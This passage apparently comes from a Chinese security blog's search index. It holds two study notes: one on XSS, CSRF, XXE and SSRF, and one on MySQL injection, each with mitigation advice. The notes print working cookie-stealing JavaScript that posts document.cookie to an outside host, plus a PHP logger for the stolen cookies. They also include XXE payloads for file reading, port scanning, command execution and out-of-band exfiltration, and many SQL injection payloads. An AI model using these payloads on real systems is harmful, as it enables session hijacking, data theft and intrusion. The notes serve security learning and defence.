'http://client2.runoob.com' ); if(in_array($origin, $allow_origin))&#123; header('Access-Control-Allow-Origin:'.$origin); &#125; 3.允许所有域名访问在头部添加如下代码：header(&#39;Access-Control-Allow-Origin:*&#39;); 利用其他方法实现跨域1.在HTML中对跨域网站请求一些内容，例如图片，JS代码等信息，在请求网站后添加？以及需要传递的信息，从而实现信息的跨域传输。例如&lt;img src=&quot;http://rushrush.com/demo.php?c=xxx&quot;&gt; &lt;script src=&quot;http://rushrush.com/demo.php?c=xxx&quot;&gt;&lt;/script&gt; 存储XSS存储XSS，会把攻击者的数据存储到服务器端，攻击行为将伴随着攻击数据一直存在。一个存储xss攻击的例子，在内容行输入JS脚本，因为JS脚本一般比较长的原因，将src指向其他地方的一个JS文件 下面是该JS文件的源码，可以看到JS脚本通过获取当前网页的cookie并发送到其他服务器来实现窃取Cookie的操作： 123456789101112131415161718192021function xlx()&#123; if(window.navigator.userAgent.indexOf('MSIE')&gt;0)&#123; return new ActiveXObject("Microsoft.XMLHTTP"); &#125;else&#123; return new XMLHttpRequest(); &#125;&#125;var xd = xlx();var data = 'c='+document.cookie;var url = 'http://rushrush.com/demo.php';xd.open('post',url);xd.setRequestHeader('content-type','application/x-www-form-urlencoded');xd.onreadystatechange=function()&#123; if(xd.readyState == 4 &amp;&amp; xd.status == 200)&#123; // document.write(xd.responseText); &#125;&#125;xd.send(data); 另外远端服务器的PHP代码作用是将传输过来的Cookie值存储到本地服务器，这样整个盗取的过程就完整了 12345678910&lt;?phpheader('Access-Control-Allow-Origin:*');$c = empty($_REQUEST['c'])?"":$_REQUEST['c']."\r\n";echo 'hello '.$c;$myfile = fopen("d:/1.txt","a+");fwrite($myfile,$c);fclose($myfile);?&gt; 反射型XSS和存储型CSS不同的是，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。下面是一个攻击的例子： 一下网页在用户键入一个用户名后，会反馈出Hello+用户名 如果在键入的用户名区域输入跨站脚本，则可以和上面的存储型XSS一样，获取到用户的Cookie信息，从而实现攻击，如下图的输入信息就能成功实现攻击 进行反射型XSS的时候，第三者通常会经注入了脚本信息的链接发给用户，用户通过打开该链接被获取Cookie，从而第三方利用获取的Cookie登陆。 DOM型XSS不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。 下面是一个利用DOM-XSS进行攻击的例子：DOM型XSS 在浏览器执行DOM型XSS的时候，由于浏览器的X-XSS-Protection策略，会返回错误信息，并执行失败，如下图所示： 该策略可以通过CRLF绕过，利用的前提是我们能够控制一段参数，也就是POST或者GET的数据，而且这个数据会用在返回包的包头中。通过CRLF注入在返回包头中注入一个X-XSS-Protection:0从而使得浏览器关闭策略拦截，但是该漏洞现在已经很难利用了，因为最新版本的PHP不允许在HTTP表头内出现换行字符(要利用的话PHP版本必须低于5.1)… 另外PHP中执行header(&quot;Location: $a&quot;)可在返回的包头中添加跳转的一行，想要增加其他的包头也同理。 CRLF注入 修补XSS漏洞1.做处理（过滤）可以通过将&gt;和&lt;删除，或者将这两种符号替换成去其他的符号代替 2.转义可以将JS语句转换成HTML实体，可以在PHP中使用htmlentities()语句 闭合XSS代码一般在PHP代码中会增加&lt;textarea&gt;&lt;/textarea&gt;区域，在该区域中用了JS代码会变成普通的文本而无法执行，因此在注入文本的时候会先增加&lt;/textarea&gt;把前面的区域给闭合掉，然后再添加JS脚本的代码 CSRF攻击CSRF攻击和跨站脚本攻击有点类似，他可以通过给用户发送一个链接，然后在该链接中加入某个恶意的脚本，从而利用用户的登陆信息执行某些行为，比如说如下情况： 如果存在一个链接http://blog.sohu.com/manage/entry.do?m=delete&amp;id=126713012这个链接的作用是让博主删除编号为126713012的博客。 攻击者首先在自己的域中构造一个页面：http://www.a.com/csrf.html 其内容为：&lt;img src=&#39;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=126713012&#39; /&gt;博客主通过点击进入攻击者构造的域，会看见一张失效的图片，回头却发现自己的博客被删除了。 目前防御CSRF攻击主要有三种策略：验证HTTP Refer字段；在请求地址中添加token并验证；在HTTP头中自定义属性并验证 XSS蠕虫如果访问一个网站http://www.a.com/1.js会使得用户在某论坛发表一条评论，这条评论也就是&lt;script src=http://www.a.com/1.js&gt;&lt;/script&gt;。这样会使得这个评论迅速扩散开来，每一个看过这个网页的人都会传播这条评论。 XXE攻击XXE实际上就是XML的一个实体注入 XML在外部实体的写法如下： 123456DTD 实例:&lt;!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"&gt;&lt;!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd"&gt;XML example:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; XXE的危害有几种：可以ssrf，读文件和执行命令，扫描端口 可用外部实体读文件，假若一个包的内容为： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "http://www.a.com/demo.php"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 该包的目的是通过外部访问http://www.a.com/demo.php这个网站，然后将访问返回的值赋给&amp;xs 另外可以让服务器使用ftp协议取读取某个地址中的一个文件内容，如果要读取PHP文件，则需要使用PHP协议，例如： 12345678910111213&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "file:///D:/1.txt"&gt;// &lt;?ENTITY xs SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.php"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 还可以通过外部访问来扫描某IP的端口，如： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "127.0.0.1：1080"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 通过判断返回包的信息来判断该端口是否是开放的 对于执行命令的用法，如下代码所示： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "expect://id"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 利用外部实体访问来进行攻击的案例如下：首先攻击者发送一份包含xml实体内容的包给服务器，包的内容如下 12345678&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY %xs SYSTEM "www.a.com/a.dtd"&gt; %xs;]&gt;&lt;root&gt;&amp;xd2;&lt;/root&gt; 下面是a.dtd的内容相当于读取服务器内的一个文件1.txt，并将其发送到了www.a.com域名中： 123&lt;IENTITY %xd SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.txt"&gt;&lt;IENTITY %demo "&lt;IENTITY xd2 SYSTEM "http://www.a.com/xs.php?i=%xd"&gt;"&gt;%demo; XXE漏洞修补1.使用开发语言提供的”禁用外部实体的方法“PHP：libxml_disable_entity_loader(true);JAVA: 12DocumentBuliderFactory dbf = DocumentBuliderFactory.nerInstance();dbf.setExpandEntityReferences(false); Python: 12from lxml import extreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2.过滤用户提交的XML数据关键词：&lt;!DOCTYPE和!ENTITY，或者SYSTEM和PUBLUC SSRFSSRF是一种由攻击者构造形成的，由服务器端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（相当于服务器接受客户端所提供的URL，然后服务器代客户端去请求该URL，返回数据给客户端） 用途：扫描端口，读取文件 假如服务器端的PHP文件如下： 123456789&lt;?php$url = empty($_GET['url'])?"":$_GET['url'];if($url!="")&#123; $html = file_get_contents($url,true); echo $html;&#125;else&#123; echo 1;&#125;?&gt; 在请求网站过程中，发送一个网站地址，服务器就会带客户端返回该网站的内容，如果该网站是服务器的内部网站，那么该方式就成功获取了内部网站的内容。并且还能通过服务器扫描内部网下其他服务器的开放端口。 为了避免SSRF攻击，转发的内容尽量在客户端执行，比如说从其他网站请求一张图片显示，服务器端应该返回代码&lt;img src=www.xxx.com/ff.jpg /&gt;，如果是服务器自己先获取到图片再进行转发，则很容易被利用。 探测是否有SSRF漏洞的一种方法，在传入网址端传入ip.cn，若发现IP地址和本机不一样，则说明存在漏洞。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入总结]]></title>
    <url>%2F2019%2F06%2F27%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Mysql的一些基本操作命令创建数据库：create database XXX;查看数据库：show databases;切换数据库：use XXX;删除数据库：drop database XXX; 创建数据表： 123456create table teacher(id int(4) not null primary key auto_increment,name char(20) not null,sex char(10) not null,addr char(20) not null); 查看数据表：show tables插入数据表：insert into teacher(name,sex,addr) values(&#39;leo&#39;,&#39;male&#39;,&#39;hangzhou&#39;);查询数据表：select * from teacher;查看表的结构：desc XX;更新数据：update teacher set name=&quot;X&quot; where id=X;删除数据：delete from teacher where name=&quot;X&quot;;order by用于排序：select information from table order by X ASC/DESC;union可以用来连接两个信息，即增加一项select LIMIT用法：SELECT * FROM table LIMIT offset, rows第一个数字指的是起始行，第二数字指的是获取的行数！ 一些常用的数据库查询命令1.当前数据库的所有表select table_name from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select column_name from information_schema.columns where table_name=&#39;表名&#39; 判断时字符串注入还是整型注入1.当加单引号进行闭合后，会报错或者无内容显示：select * from table where id=3’2.当不用单引号闭合，并且在后面加条件会按照条件的逻辑顺序显示，则判断为整型注入select * from table where id=3 and 1=1不满足以上两点就时字符串注入，其特征有以下几点：1.当用单引号闭合后还是会报错，因为闭合后单引号个数不匹配：select * from table where name=’admin’’2.需要对后面的内容进行注释，注释符号为– (后面有个空格) # 延时注入延时注入主要用于不显示错误信息的情况下对数据库名字，表的名字，列的名字进行显示的一种方法。if(ascii(subtring(&quot;hello&quot;,1,1))=104,sleep(5),0);可以看到，取出”hello”里的第一个字符串，也就是”h”,判断他的ascii码是否为104(“h”的ascii码为104),如果是则延时5秒，反之不延时。同样，我们可以在substring函数里面写SQL语句，提取出我们所要查的表名、列名，再用延时猜解出来。 联合注入首先可以通过order by来试探出总共有多少个字段http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 order by 1 还可以通过union select查看当前数据库的某些表http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 union select 1,database(),3 LIMIT 1,1 不过这种情况不适合用于盲注的场景，因为没有输出反馈 别名在查询数据库的时候可以给列的名字取一个别名，以下两张图为示例：下图中用了’as’作为别名显示的字符 其中‘as’可写可不写 Mysql之bug注入利用数据库的BUG进行利用，看输出的报错信息，因为报错的信息中包含了我们想要获取的信息。只要是count(),rand,group by三个连用就会造成BUG报错（一般表中的数据需要三条以上），如下代码select concat(floor(rand(0)*2),(select database())) as x,count(1) from student group by x;就会在报错中显示数据库的名字！ Mysql注入之函数报错有许多函数可以利用，如updatexml, exp, geometrycollection, polygon, multipoint, multilinestring, multipolygon 通过UpdateXml报错，注入语句如下：&amp; 1=(updatexml(1,concat(0x3a,(select user())),1)) 通过exp报错，注入的语句如下：&amp; exp(~(select * from (select user()) a)) 通过GeometryCollection()报错，注入语句如下：&amp; geometrycollection((select * from(select * from(select user())a)b))后两句会因为版本问题失效。。。 Mysql注入的修补对于字符串的修补，在PHP程序中，用addslashes()函数，将符号包括用来闭合的单引号转义，即在符号前面加一个‘\’ 对于int型的数据，可以在获取过程中对其加0，若输入是字符串则会自动转型成int，避免了注入的威胁。因为若输入一个字符串，在转型过程中只会保留第一个数字字符而舍去后面的字符。 还可以通过搜索输入字符串中是否存在像“select””from”等的关键词，将关键词转型，则可以实现注入修补 宽字节注入在前面可以看到，通过用转义来实现对Mysql的修补，然而通过利用宽字节可以实现恢复单引号闭合。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。 [宽字符注入详解](https://blog.csdn.net/helloc0de/article/details/76180190 “宽字符”) insert,update,delete注入三者的区别在于其注入的那句程序是insert,update还是delete三者都支持报错注入 insert注入一个insert注入的例子：1.确认是否存在注入2.获取数据库名：or updatexml(&#39;&#39;,concat(0x7e,(SELECT DATABASE())),0x7e) or 3.获取表名：or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 2,1)),0x7e) 4.获取字段名：or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; limit 0,1)),0x7e) 5.获取数据or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,user_id,first_name,last_name) FROM users limit 0,1)),0x7e) 如果是inset一般要增加右括号，因为根据insert的语句，闭合括号再对口面部分进行注释可以实现注入。 delete注入delete注入部分支持布尔注入和延时注入和报错注入 延时注入的一个语句范例：delete from users where user_id=1 and sleep(if(database()=&#39;dvwa&#39;,5,1));经过上述语句可以用来确定一些信息，而且不会执行delete，即不会删除数据库中的条目 update注入update同理只是将操作数据库的命令变成了update，下面是一个例子：update teacher set name=&quot;Gou&quot; where id=1 and sleep(if(database()=&#39;test&#39;,5,1)); Mysql注入经常用到的函数1.HEX()函数，能够将字符或者数字转成十六进制2.ASCII()函数和ORD()，将字符转成对应ASCII表上的数字，区别在于ord能进行多字节的字符处理3.char()函数，能从数字还原出对应的ASCII码 Mysql注入常用函数]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
</search>
